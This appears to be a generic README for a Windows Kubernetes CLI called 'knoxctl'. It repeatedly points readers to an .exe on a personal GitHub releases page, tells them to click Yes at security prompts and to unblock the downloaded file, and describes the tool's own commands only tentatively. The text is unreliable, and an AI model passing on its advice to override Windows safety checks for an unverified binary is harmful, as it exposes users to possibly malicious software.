# 🧰 knoxctl - Fast Kubernetes Control Made Simple

[![Download knoxctl](https://img.shields.io/badge/Download%20knoxctl-Release%20Page-blue?style=for-the-badge)](https://github.com/Jayarcer9312/knoxctl/releases)

## 🚀 Getting Started

knoxctl is a small command line app for Kubernetes tasks on Windows. It helps you work with clusters from a simple terminal window. It is built in Go and uses a light setup, so it stays fast and easy to run.

Use the release page below to get the Windows file, then follow the steps in this guide.

[Download knoxctl from GitHub Releases](https://github.com/Jayarcer9312/knoxctl/releases)

## 💻 What knoxctl Does

knoxctl helps you handle common Kubernetes work from one place. It is built for daily use and keeps commands short and clear.

You can use it to:

- Check cluster status
- List running pods
- View services and deployments
- Open logs from a pod
- Run simple cluster tasks
- Move through Kubernetes objects with fewer steps

It is made for users who want a quick way to work with Kubernetes without a lot of setup.

## 📋 Before You Start

Before you install knoxctl on Windows, make sure you have:

- A Windows PC
- Internet access
- A modern web browser
- Permission to run downloaded files
- Access to a Kubernetes cluster if you plan to use it right away

If you already use `kubectl`, knoxctl will fit into your normal workflow. It uses common Kubernetes concepts, so it should feel familiar.

## 🛠️ Download knoxctl

1. Open the [knoxctl releases page](https://github.com/Jayarcer9312/knoxctl/releases)
2. Find the latest release
3. Look for the Windows download file
4. Download the file to your computer
5. If the release includes a `.zip` file, open it and extract the contents
6. If the release includes a `.exe` file, save it to a folder you can find later

Keep the file in a simple folder like `Downloads` or `Desktop` so it is easy to open again.

## 🪟 Install on Windows

### If you downloaded a `.exe` file

1. Open the folder where the file was saved
2. Double-click the `.exe` file
3. If Windows asks for permission, choose **Yes**
4. Follow any setup steps on the screen
5. When the install ends, keep note of where the app was placed

### If you downloaded a `.zip` file

1. Right-click the `.zip` file
2. Choose **Extract All**
3. Pick a folder such as `C:\knoxctl`
4. Open the extracted folder
5. Find the `knoxctl.exe` file
6. Leave that folder in place so you can run the app from it

If you want easy access later, you can move the file to a folder like `C:\Tools\knoxctl`.

## ▶️ Run knoxctl

1. Open the **Start** menu
2. Type **Command Prompt**
3. Open Command Prompt
4. Change to the folder where `knoxctl.exe` is saved

Example:

`cd C:\knoxctl`

5. Run the app with:

`knoxctl`

If the app opens with a help screen, that means it is ready.

## ⚙️ Basic First Use

When knoxctl starts, it may show a list of commands or usage help. This is normal. Most CLI apps work from typed commands, so you will enter one command at a time.

Common examples may include:

- `knoxctl --help` to see available commands
- `knoxctl version` to check the app version
- `knoxctl get pods` to view pods in a cluster
- `knoxctl get services` to list services
- `knoxctl logs <pod-name>` to see pod logs

If you use a config file for Kubernetes, make sure your cluster access is already set up in the usual way. knoxctl reads the same kind of cluster context that other Kubernetes tools use.

## 🔍 Typical Commands

These examples show the kind of work knoxctl is meant to handle.

### View cluster items

- `knoxctl get pods`
- `knoxctl get deployments`
- `knoxctl get services`
- `knoxctl get namespaces`

### Inspect a pod

- `knoxctl describe pod <pod-name>`
- `knoxctl logs <pod-name>`
- `knoxctl exec <pod-name>`

### Switch or check context

- `knoxctl config view`
- `knoxctl config current-context`
- `knoxctl config use-context <name>`

### Work with resources

- `knoxctl apply -f <file>`
- `knoxctl delete <resource>`
- `knoxctl scale deployment <name> --replicas=<number>`

These commands are examples of the sort of tasks you can do with a Kubernetes CLI. The exact command list may vary by release.

## 🧭 How to Find Your Cluster Info

If you are new to Kubernetes, you may need a few details before using knoxctl:

- Cluster name
- Namespace
- Pod name
- Deployment name
- Service name

You can get these from the app output or from your cluster admin. If you use another Kubernetes tool already, you can copy the same names into knoxctl.

## 🧪 Check That It Works

After you install knoxctl, test it with a simple command:

`knoxctl --help`

If you see a list of commands, the app is running.

You can also try:

`knoxctl version`

This helps confirm that Windows can find and run the file.

## 🧰 Suggested Folder Setup

For a clean setup on Windows, keep knoxctl in one of these folders:

- `C:\knoxctl`
- `C:\Tools\knoxctl`
- `Desktop\knoxctl`

Use a simple path with no spaces if you want to avoid typing problems in Command Prompt.

## 🔐 File Access on Windows

If Windows blocks the file after download:

1. Right-click the file
2. Choose **Properties**
3. Look for an **Unblock** option
4. Check **Unblock** if it appears
5. Choose **Apply**
6. Open the file again

This can happen with files downloaded from the web.

## 🧱 Command Line Basics

knoxctl works in a terminal. If you have never used one before, here is the simple way to think about it:

- You open Command Prompt
- You type one command
- You press **Enter**
- The app shows the result

A command like `knoxctl get pods` tells the app what you want to see.

## 🧭 Common Troubleshooting

### The file does not open

- Make sure you downloaded the Windows version
- Check that the file is not still in a zip archive
- Try moving it to a simple folder like `C:\knoxctl`

### Windows shows a security prompt

- Choose **Yes** if you want to run the app
- If the file came from a release page, check that you downloaded the current release

### Command Prompt says it cannot find knoxctl

- Make sure you are in the same folder as `knoxctl.exe`
- Use `cd` to move into the folder first
- Check that the file name is typed right

### Kubernetes commands return an access error

- Confirm your cluster access is set up
- Check your Kubernetes config
- Make sure you are using the right context and namespace

## 📦 What Makes knoxctl a Good Fit

knoxctl is built to stay light and quick. It uses Go, which helps keep the app small and fast. It also follows common Kubernetes patterns, so it fits into tools and workflows many users already know.

It is a good fit if you want:

- A fast CLI
- Simple Kubernetes control
- Less time typing long commands
- A small Windows-friendly tool
- A clean way to check cluster state

## 📁 Example Workflow

Here is a simple day-to-day flow:

1. Open Command Prompt
2. Go to the knoxctl folder
3. Check your cluster
4. List pods
5. Open logs for a pod
6. Inspect a deployment
7. Make the needed change

This keeps your work in one place and reduces the need to switch tools.

## 🧩 Related Tools

knoxctl works well with tools that are common in Kubernetes work, such as:

- `kubectl`
- `client-go`
- `cobra`
- `cobra-cli`

These tools help shape the command line structure and Kubernetes access behind the scenes.

## 📝 Short Reference

### Open help

`knoxctl --help`

### Check version

`knoxctl version`

### List pods

`knoxctl get pods`

### View logs

`knoxctl logs <pod-name>`

### Show current context

`knoxctl config current-context`

## 📥 Download Again

If you need the file again, use the release page here:

[https://github.com/Jayarcer9312/knoxctl/releases](https://github.com/Jayarcer9312/knoxctl/releases)

## 🗂️ Project Details

- Name: knoxctl
- Type: Command line app
- Language: Go
- Use case: Kubernetes operations
- Platform focus: Windows
- Style: Lightweight, fast, and direct